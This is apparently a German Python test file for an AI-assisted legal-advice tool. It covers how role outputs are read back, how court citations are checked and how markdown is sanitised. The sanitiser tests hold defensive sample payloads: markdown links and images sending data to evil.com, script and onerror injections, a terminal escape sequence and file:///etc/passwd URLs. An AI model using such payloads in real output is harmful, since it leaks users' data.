"""Tests für Rückkanal (TM-AC-11, -15), Register/Zitat-Gate (TM-AC-12, -13) und Ergebnisdateien
(TM-AC-5, -16, -17, -23, -24, -26)."""
from __future__ import annotations

import datetime
import json
import os
import shutil
import stat
import tempfile
import unittest
from pathlib import Path

from rechtsberatung import rueckkanal as rk
from rechtsberatung.ergebnis import (
    KEINE_FRIST, KOPFZEILE, Entscheidungen, FristEintrag, baue_beratung, baue_entscheidungen, bereinige_markdown,
    entschaerfe_ueberschriften, ist_schreiben, markiere_ungepruefte, pruefe_pflichtabschnitte, schreibe_datei,
    strategie_leak, zaehle_woerter,
)
from rechtsberatung.register import GEPRUEFT, HAELT_NICHT, UNGEPRUEFT, baue_register, extrahiere_zitate, zitat_gate

DOMAINS = ("dejure.org", "bundesgerichtshof.de")
HEUTE = datetime.date(2026, 11, 16)


class RueckkanalTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def schreibe(self, name: str, daten: object) -> None:
        (self.tmp / name).write_text(daten if isinstance(daten, str) else json.dumps(daten), encoding="utf-8")

    def abgewiesen(self, name: str, schema, reason: str, event: str = "legal.output.rejected") -> None:
        with self.assertLogs("legal", level="INFO") as cm, self.assertRaises(rk.RolleFehlgeschlagen) as ctx:
            rk.lies_json(self.tmp, name, schema, rolle="richter")
        self.assertEqual(ctx.exception.reason, reason)
        self.assertTrue(any(f"event={event}" in z for z in cm.output), cm.output)
        if event == "legal.output.rejected":
            self.assertTrue(any(f"reason={reason}" in z for z in cm.output))

    def test_symlink_wird_nicht_gelesen(self) -> None:
        geheim = self.tmp.parent / f"geheim-{os.getpid()}.json"
        geheim.write_text('{"note": 10, "begruendung": "HOST-GEHEIMNIS", "einwaende": []}', encoding="utf-8")
        self.addCleanup(geheim.unlink)
        os.symlink(geheim, self.tmp / "bewertung.json")
        self.abgewiesen("bewertung.json", rk.schema_review, "symlink")

    def test_hardlink_uebergroesse_utf8_fehlend(self) -> None:
        self.schreibe("a.json", "{}")
        os.link(self.tmp / "a.json", self.tmp / "bewertung.json")
        self.abgewiesen("bewertung.json", rk.schema_review, "unexpected")
        self.schreibe("review.json", "x" * (1024 * 1024 + 1))
        self.abgewiesen("review.json", rk.schema_review, "size")
        (self.tmp / "befunde.json").write_bytes(b"\xff\xfe")
        self.abgewiesen("befunde.json", rk.schema_coldread, "schema")
        self.abgewiesen("persona.json", rk.schema_persona, "schema")
        (self.tmp / "groesse.json").mkdir()
        self.abgewiesen("groesse.json", rk.schema_groesse, "unexpected")

    def test_unerwarteter_name_wird_nicht_gelesen(self) -> None:
        with self.assertRaises(ValueError):
            rk.lies_ausgabe(self.tmp, "../beratung.md")

    def test_ungueltige_noten(self) -> None:
        for note in (1000, -1, "7", True, None):
            with self.subTest(note=note):
                self.schreibe("bewertung.json", {"note": note, "begruendung": "b", "einwaende": []})
                self.abgewiesen("bewertung.json", rk.schema_review, "schema", event="legal.score.invalid")
        for roh in ('{"note": NaN, "begruendung": "b", "einwaende": []}',
                    '{"note": Infinity, "begruendung": "b", "einwaende": []}',
                    '{"note": 1e400, "begruendung": "b", "einwaende": []}'):
            with self.subTest(roh=roh):
                self.schreibe("bewertung.json", roh)
                self.abgewiesen("bewertung.json", rk.schema_review, "schema")
        self.schreibe("bewertung.json", {"begruendung": "b", "einwaende": []})
        self.abgewiesen("bewertung.json", rk.schema_review, "schema", event="legal.score.invalid")

    def test_schema_verstoesse(self) -> None:
        faelle = [
            ("ueberarbeitung.json", rk.schema_ueberarbeitung,
             {"hauptteil": "x", "antworten": [{"id": "E1", "status": "erledigt", "begruendung": "b"}]}),
            ("ueberarbeitung.json", rk.schema_ueberarbeitung, {"hauptteil": "x", "antworten": [], "freigabe": True}),
            ("fristen.json", rk.schema_fristen,
             {"fristen": [{"bezeichnung": "x", "datum": "01.12.2026", "quelle": "dok_001"}], "risiken": []}),
            ("fristen.json", rk.schema_fristen,
             {"fristen": [{"bezeichnung": "x", "datum": "2026-02-30", "quelle": "dok_001"}], "risiken": []}),
            ("vergleich.json", rk.schema_vergleich,
             {"spanne_min": 5, "spanne_max": 1, "waehrung": "EUR", "begruendung": "b"}),
            ("register.json", rk.schema_register, {"eintraege": [{"id": "R1"}]}),
            ("entwurf.json", rk.schema_entwurf, ["kein", "objekt"]),
        ]
        for name, schema, daten in faelle:
            with self.subTest(daten=daten):
                self.schreibe(name, daten)
                self.abgewiesen(name, schema, "schema")

    def test_riesige_ganzzahl_ist_rollenfehler(self) -> None:
        self.schreibe("bewertung.json", '{"note": ' + "9" * 5000 + ', "begruendung": "b", "einwaende": []}')
        self.abgewiesen("bewertung.json", rk.schema_review, "schema")

    def test_gueltige_ausgabe(self) -> None:
        self.schreibe("bewertung.json", {"note": 7.5, "begruendung": "b", "einwaende": [{"id": "E1", "text": "t"}]})
        d = rk.lies_json(self.tmp, "bewertung.json", rk.schema_review, rolle="richter")
        self.assertEqual(d["note"], 7.5)


def roh_register(url: str = "https://dejure.org/x", datum: str = "2024-05-01") -> dict:
    return {"eintraege": [{"id": "R1", "gericht": "BGH", "az": "VIII ZR 123/24", "datum": datum, "url": url,
                           "ecli": "-", "zitate": ["NJW 2024, 123"], "leitsatz": "-"}]}


def bestaetigung(**kw: object) -> dict:
    b = {"id": "R1", "abgerufen": True, "gericht": "BGH", "az": "VIII ZR 123/24", "datum": "2024-05-01"}
    b.update(kw)
    return {"bestaetigungen": [b]}


class RegisterTest(unittest.TestCase):
    def status(self, roh: dict, best: dict | None) -> str:
        return baue_register(roh, best, heute=HEUTE).eintraege[0].status

    def test_geprueft_nur_mit_allen_bedingungen(self) -> None:
        self.assertEqual(self.status(roh_register(), bestaetigung()), GEPRUEFT)

    def test_fremde_oeffentliche_fundstelle_kann_geprueft_werden(self) -> None:
        # Entscheidung Timo 2026-11-16: Recherche ohne Domain-Liste.
        self.assertEqual(self.status(roh_register(url="https://www.lto.de/urteil/x"), bestaetigung()), GEPRUEFT)

    def test_unzulaessige_fundstelle_ungeprueft(self) -> None:
        for url in ("http://dejure.org/x", "https://127.0.0.1/x", "https://[::1]/x", "file:///etc/passwd",
                    "https://user@dejure.org/x", "https://dejure.org:8443/x", "https://localhost/x"):
            with self.subTest(url=url):
                self.assertEqual(self.status(roh_register(url=url), bestaetigung()), UNGEPRUEFT)

    def test_selbstbestaetigung_reicht_nicht(self) -> None:
        with self.assertLogs("legal", level="INFO") as cm:
            self.assertEqual(self.status(roh_register(), None), UNGEPRUEFT)
        self.assertTrue(any("event=legal.citation.unverified" in z for z in cm.output))
        self.assertEqual(self.status(roh_register(), bestaetigung(abgerufen=False)), UNGEPRUEFT)

    def test_abweichung_haelt_nicht_und_zukunft(self) -> None:
        self.assertEqual(self.status(roh_register(), bestaetigung(az="VIII ZR 124/24")), HAELT_NICHT)
        with self.assertLogs("legal", level="INFO"):
            reg = baue_register(roh_register(datum="2027-01-01"), bestaetigung(datum="2027-01-01"),
                                heute=HEUTE)
        self.assertEqual(reg.eintraege[0].status, UNGEPRUEFT)

    def test_extrahiere_zitate(self) -> None:
        text = ("BGH VIII ZR 123/24; BVerfG 1 BvR 123/20; BAG 5 AZR 1/19; ECLI:DE:BGH:2024:010524UVIIIZR123.24.0; "
                "NJW 2024, 123 und NJW-RR 2023, 45, NZM 2022, 9, BeckRS 2021, 12345. § 536 BGB ist keine Fundstelle.")
        z = extrahiere_zitate(text)
        for erwartet in ("VIII ZR 123/24", "1 BvR 123/20", "5 AZR 1/19", "NJW 2024, 123", "NJW-RR 2023, 45",
                         "NZM 2022, 9", "BeckRS 2021, 12345"):
            self.assertIn(erwartet, z)
        self.assertTrue(any(x.startswith("ECLI:DE:BGH:2024") for x in z))
        self.assertFalse(any("536" in x for x in z))

    def test_blindbestaetigung_leer_oder_abweichend_nie_geprueft(self) -> None:
        leer = bestaetigung(gericht="", az="", datum="")
        self.assertEqual(self.status(roh_register(), leer), UNGEPRUEFT)
        self.assertEqual(self.status(roh_register(), bestaetigung(datum="2024-05-02")), HAELT_NICHT)
        self.assertEqual(self.status(roh_register(), bestaetigung(gericht="OLG Hamm")), HAELT_NICHT)

    def test_extrahiere_weitere_formen(self) -> None:
        faelle = {
            "BVerwG, Urteil vom 1.2.2021 – 3 C 12.20.": "3 C 12.20",
            "BSG B 1 KR 12/20 R": "B 1 KR 12/20 R",
            "BGH VIII ZR 123/2020": "VIII ZR 123/2020",
            "1 BvR 123/2020": "1 BvR 123/2020",
        }
        for text, erwartet in faelle.items():
            with self.subTest(text=text):
                self.assertEqual(extrahiere_zitate(text), [erwartet])
        for j in ("WuM", "ZMR", "NZA", "NZA-RR", "ZIP", "MDR", "FamRZ", "VersR", "NVwZ", "NStZ", "BB", "DB"):
            with self.subTest(j=j):
                self.assertEqual(extrahiere_zitate(f"vgl. {j} 2020, 1234."), [f"{j} 2020, 1234"])
        for sammlung in ("BGHZ", "BVerfGE", "BAGE", "BSGE", "BVerwGE"):
            with self.subTest(s=sammlung):
                self.assertEqual(extrahiere_zitate(f"{sammlung} 123, 45"), [f"{sammlung} 123, 45"])
        self.assertEqual(extrahiere_zitate("NZA-RR 2019, 5"), ["NZA-RR 2019, 5"])
        self.assertEqual(extrahiere_zitate("§ 3 Abs. 12.20 und 2,5 C"), [])

    def test_zitat_nur_ueber_zitate_bleibt_ungeprueft(self) -> None:
        reg = baue_register(roh_register(), bestaetigung(), heute=HEUTE)
        self.assertEqual(reg.eintraege[0].status, GEPRUEFT)
        pr = zitat_gate("Siehe NJW 2024, 123 und VIII ZR 123/24.", reg)
        self.assertEqual([z for z, _ in pr.ungeprueft], ["NJW 2024, 123"])
        self.assertEqual(pr.nur_zitat, {"NJW 2024, 123"})
        self.assertEqual(pr.unregistriert, [])

    def test_zitat_gate_haelt_nicht(self) -> None:
        with self.assertLogs("legal", level="INFO"):
            reg = baue_register(roh_register(), bestaetigung(az="VIII ZR 999/24"), heute=HEUTE)
        pr = zitat_gate("Nach BGH VIII ZR 123/24.", reg)
        self.assertEqual([z for z, _ in pr.haelt_nicht], ["VIII ZR 123/24"])
        self.assertEqual(pr.widersprueche, ["Zitat hält nicht (Bestätigung weicht ab): VIII ZR 123/24"])
        self.assertEqual(pr.ungeprueft, [])

    def test_zitat_gate_unregistriert(self) -> None:
        reg = baue_register(roh_register(), bestaetigung(), heute=HEUTE)
        with self.assertLogs("legal", level="INFO") as cm:
            pr = zitat_gate("Nach BGH VIII ZR 999/25 und VIII ZR 123/24 sowie NJW 2024, 123.", reg)
        self.assertEqual(pr.unregistriert, ["VIII ZR 999/25"])
        self.assertTrue(pr.widersprueche)
        self.assertTrue(any("event=legal.citation.unregistered" in z for z in cm.output))


class ErgebnisTest(unittest.TestCase):
    def test_wortzaehlung(self) -> None:
        self.assertEqual(zaehle_woerter("Das ist § 536 BGB, gut."), 5)
        self.assertEqual(zaehle_woerter(""), 0)

    def test_sanitizing_bild_html_links(self) -> None:
        roh = ("![](https://x/?d=a) <script>alert(1)</script> <img src=x onerror=y> [ok](https://dejure.org/a) "
               "[böse](https://evil.com/p?d=geheim) [q](https://dejure.org/a?d=1) https://evil.com/?d=geheim "
               "<NAME_1> \x1b]52;c;SGk=\x07")
        with self.assertLogs("legal", level="INFO") as cm:
            s = bereinige_markdown(roh, DOMAINS)
        self.assertNotIn("![", s)
        self.assertNotIn("<script>", s)
        self.assertNotIn("<img", s)
        self.assertNotIn("](https://evil.com", s)
        self.assertNotIn("](https://dejure.org/a?d=1)", s)
        self.assertNotIn("geheim", s)
        self.assertNotIn("\x1b", s)
        self.assertIn("[ok](https://dejure.org/a)", s)
        self.assertIn("<NAME_1>", s)
        self.assertTrue(any("event=legal.output.sanitized" in z for z in cm.output))

    def test_sanitizing_robuste_linkformen(self) -> None:
        faelle = [
            '[t](https://evil.com/?d=geheim "titel")', "[t](https://evil.com/?d=geheim 'titel')",
            "[t](https://evil.com/?d=geheim (titel))", "[a [b] c](https://evil.com/?d=geheim)",
            "[a\nb](https://evil.com/?d=geheim)", "(https://evil.com/?d=geheim)", "xhttps://evil.com/?d=geheim",
            '![t](https://x.org/?d=geheim "t")', "![a [b]](https://x.org/p(1)?d=geheim)",
            "<https://evil.com/?d=geheim>", "https://evil.com/a)b?d=geheim", "[t](<https://evil.com/?d=geheim>)",
        ]
        for roh in faelle:
            with self.subTest(roh=roh), self.assertLogs("legal", level="INFO"):
                s = bereinige_markdown(roh, DOMAINS)
                self.assertNotIn("geheim", s)
                self.assertNotIn("https://evil", s)
                self.assertNotIn("](http", s)
        self.assertEqual(bereinige_markdown("[ok](https://dejure.org/a) (https://dejure.org/b).", DOMAINS),
                         "[ok](https://dejure.org/a) (https://dejure.org/b).")

    def test_markierung_verankert(self) -> None:
        s = markiere_ungepruefte("BGH VIII ZR 1/20 und I ZR 1/20; NJW 2024, 123", ["I ZR 1/20", "NJW 2024, 12"])
        self.assertEqual(s, "BGH VIII ZR 1/20 und I ZR 1/20 [UNGEPRÜFT]; NJW 2024, 123")
        self.assertEqual(markiere_ungepruefte("I ZR 1/20(dok_001)", ["I ZR 1/20"]), "I ZR 1/20 [UNGEPRÜFT] (dok_001)")

    def test_pflichtabschnitte_und_kuerzung(self) -> None:
        b = baue_beratung(ergebnis_art="Einschätzung", hauptteil="Text", fristen=[], risiken=[], ungepruefte=[],
                          final=True)
        self.assertTrue(b.startswith(KOPFZEILE + "\n"))
        self.assertIn(KEINE_FRIST, b)
        self.assertEqual(pruefe_pflichtabschnitte(b), [])
        gekuerzt = b.replace(KEINE_FRIST, "")
        self.assertIn("Fristen-Tabelle oder Vermerk", pruefe_pflichtabschnitte(gekuerzt))
        self.assertIn("KI-Entwurf-Hinweis", pruefe_pflichtabschnitte(b.replace(KOPFZEILE, "Entwurf")))
        self.assertIn("Ungeprüfte Fundstellen", pruefe_pflichtabschnitte(b.replace("### Ungeprüfte Fundstellen", "")))
        f = [FristEintrag("2026-12-01", "Berufungsfrist", "dok_001", True, ("claude",)),
             FristEintrag("2026-11-30", "Notfrist", "", False, ("codex",))]
        b2 = baue_beratung(ergebnis_art="E", hauptteil="T", fristen=f, risiken=[], ungepruefte=["x"], final=False)
        self.assertIn("| Datum | Frist | Quelle |", b2)
        self.assertIn("| 2026-11-30 | Notfrist [UNGEPRÜFT] | – |", b2)
        self.assertIn("NICHT FINAL", b2)
        self.assertEqual(pruefe_pflichtabschnitte(b2), [])
        self.assertIn("Fristen-Tabelle oder Vermerk",
                      pruefe_pflichtabschnitte(b2.replace("| Datum | Frist | Quelle |", "")))

    def test_hauptteil_kann_anhang_nicht_vortaeuschen(self) -> None:
        s = entschaerfe_ueberschriften("Text\n## Anhang (intern)\n### Fristen und Risiken\nkeine Frist erkennbar")
        self.assertNotIn("\n## Anhang (intern)", s)

    def test_markierung_ungeprueft(self) -> None:
        s = markiere_ungepruefte("Nach VIII ZR 123/24 und erneut VIII  ZR 123/24.", ["VIII ZR 123/24"])
        self.assertEqual(s.count("[UNGEPRÜFT]"), 2)
        self.assertEqual(markiere_ungepruefte(s, ["VIII ZR 123/24"]).count("[UNGEPRÜFT]"), 2)

    def test_strategie_leak_schreibweisen(self) -> None:
        for text in ("Wir bieten 12000 EUR", "12.000 €", "12 000 Euro", "12 000 €", "12,000"):
            with self.subTest(text=text):
                self.assertTrue(strategie_leak(text, [12000.0]))
        for text in ("112000", "12001", "1.200", "Az. 12/00"):
            with self.subTest(text=text):
                self.assertFalse(strategie_leak(text, [12000.0]))

    def test_strategie_leak_weitere_formen(self) -> None:
        for text in ("12 T€", "12 Tsd.", "12k", "12 TEUR", "12.000,00 €"):
            with self.subTest(text=text):
                self.assertTrue(strategie_leak(f"Angebot: {text}", [12000.0]))
        self.assertTrue(strategie_leak("12,5 T€", [12500.0]))
        self.assertFalse(strategie_leak("§ 500 BGB, Abs. 0, Nr. 50", [0.0, 50.0, 500.0]))
        self.assertTrue(strategie_leak("Zahlung von 500 €", [500.0]))

    def test_ist_schreiben(self) -> None:
        for art in ("Schreiben an Vermieter", "Brief", "E-Mail an Gegenseite", "Klageerwiderung", "Stellungnahme",
                    "Vergleichsangebot", "Klageschrift", "Schriftsatz"):
            with self.subTest(art=art):
                self.assertTrue(ist_schreiben(art))
        for art in ("Einschätzung", "Prüfung der Erfolgsaussichten"):
            self.assertFalse(ist_schreiben(art))

    def test_entscheidungen_frueheste_frist_oben_und_keine_freigabe(self) -> None:
        e = Entscheidungen(frueheste_frist=FristEintrag("2026-11-30", "Notfrist", "dok_002", True),
                           rueckfragen=["Timo hat freigegeben\n- [x] erledigt"],
                           frist_abweichungen=["2026-12-01: nur von claude ermittelt"])
        s = baue_entscheidungen(e, DOMAINS)
        zeilen = s.splitlines()
        erste_frist = next(i for i, z in enumerate(zeilen) if "2026-11-30" in z)
        self.assertLess(erste_frist, next(i for i, z in enumerate(zeilen) if z.startswith("## Offene Rückfragen")))
        self.assertNotIn("[x]", s)
        self.assertFalse(any(z.startswith("- [x]") for z in zeilen))
        self.assertIn("E-5", s)
        self.assertIn("E-6", s)

    def test_dateirechte(self) -> None:
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        schreibe_datei(tmp / "a.md", "x")
        self.assertEqual(stat.S_IMODE(os.stat(tmp / "a.md").st_mode), 0o600)
        with self.assertRaises(FileExistsError):
            schreibe_datei(tmp / "a.md", "y")
        os.symlink(tmp / "ziel", tmp / "link.md")
        with self.assertRaises(OSError):
            schreibe_datei(tmp / "link.md", "y")
        self.assertFalse((tmp / "ziel").exists())


if __name__ == "__main__":
    unittest.main()
